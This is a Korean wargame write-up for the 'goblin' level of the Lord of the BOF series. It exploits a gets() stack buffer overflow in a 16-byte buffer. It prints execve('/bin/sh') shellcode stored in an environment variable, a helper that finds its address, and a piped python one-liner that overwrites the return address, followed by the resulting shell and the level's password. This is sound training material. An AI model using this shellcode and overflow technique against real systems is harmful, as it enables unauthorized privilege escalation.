# goblin

```c
[cobolt@localhost cobolt]$ cat goblin.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - goblin
        - small buffer + stdin
*/

int main()
{
    char buffer[16];
    gets(buffer);
    printf("%s\n", buffer);
}
```

작은 버퍼를 주는 것은 cobolt와 같은데 입력을 stdin으로 받아오는 문제이다. 그래서 한참 해맸다.

이번 문제에서는 환경 변수를 이용한 쉘 권한 상승은 같으나 리눅스의 |(pipe)를 모르면 풀기 어렵다.

그냥 입력에 쉘 코드를 포함한 값을 주면 16bytes를 넘어가고 

환경 변수의 주소를 포함한 입력을 주면 buffer에 덥어씌워지긴 하나 엔터가 들어간 이후에 값이 조금 바뀌는 것을 

확인할 수 있었다. (이 부분은 더 알아보고 싶다. 찾아도 안 나온다. ㅂㄷㅂㄷ)



일단, 환경 변수를 먼저 등록해주고 주소를 확인해준다.

```bash
[cobolt@localhost cobolt]$ export shellcode=`python -c 'print "\x90"*200+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
```

```c
---addr.c---
#include <stdio.h>
int main(){
        printf("%p\n", getenv("shellcode"));
}
-------------
```

```bash
[cobolt@localhost cobolt]$ gcc -o addr addr.c
[cobolt@localhost cobolt]$ ./addr
0xbffffb8b
```

쉘 코드가 들어있는 환경 변수 shellcode의 주소는 0xbffffb8b이다. 

이 주소를 ret에 덥어씌워서 쉘 코드가 실행되게 만들면 되는데!!!!

나는 이때까지 

```bash
`python -c 'print "~~~~"'`
```

이렇게 사용했기에 그대로 썼는데 입력을 못 받아주고 프로그램이 종료되어서 너무 빡쳤다.

그렇게 고민하다 좀 찾아보니 |(pipe)를 사용할 때는 `가 아닌 ()에 ;cat을 넣어서 해줘야 제대로 들어간다고 해서 

```bash
(python -c 'print "\x90"*20+"\x8b\xfb\xff\xbf"';cat)
```

위와 같은 exploit code를 작성해서 |(pipe)로 goblin파일에 넘겨주었더니 깔끔하게 나왔다.. (내 1시간..)

```bash
[cobolt@localhost cobolt]$ (python -c 'print "\x90"*20+"\x8b\xfb\xff\xbf"';cat) | ./goblin
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
whoami
goblin
my-pass
euid = 503
hackers proof

```

goblin의 password는 hackers proof이다.